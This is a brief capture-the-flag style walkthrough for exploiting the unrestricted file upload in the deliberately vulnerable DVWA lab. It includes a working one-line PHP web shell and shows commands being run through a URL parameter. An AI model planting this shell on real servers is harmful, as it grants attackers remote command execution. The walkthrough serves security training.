# Walkthrough — DVWA File Upload

## Objective
Upload and execute a simple web shell.

## Target
- Application: DVWA
- URL: `http://<TARGET-IP>:8082`
- Vulnerability: Unrestricted File Upload
- Credentials: admin / password

## Tools
- Browser
- Burp Suite or similar interception proxy (recommended)

## Step 1 — Login to DVWA
Open `http://<TARGET-IP>:8082`, log in with `admin / password`, and set **DVWA Security** to **Low**.
## Step 2 — Open the File Upload module
Go to the **File Upload** page in DVWA.
## Step 3 — Prepare a PHP web shell
Create a minimal PHP payload such as `<?php system($_GET['cmd']); ?>` and save it as a `.php` file.
## Step 4 — Upload the shell and browse to it
Upload the file, then open the returned upload path and pass a command parameter such as `?cmd=id`.
## Step 5 — Complete the challenge
Record the uploaded filename and the command output returned by the shell.

## Notes
- Perform this activity only inside the intended lab environment.
- Record the exact request, payload, or object reference that worked.

## MITRE ATT&CK Mapping
- Tactic: Persistence
- Technique: Web Shell
- Technique ID: T1505.003
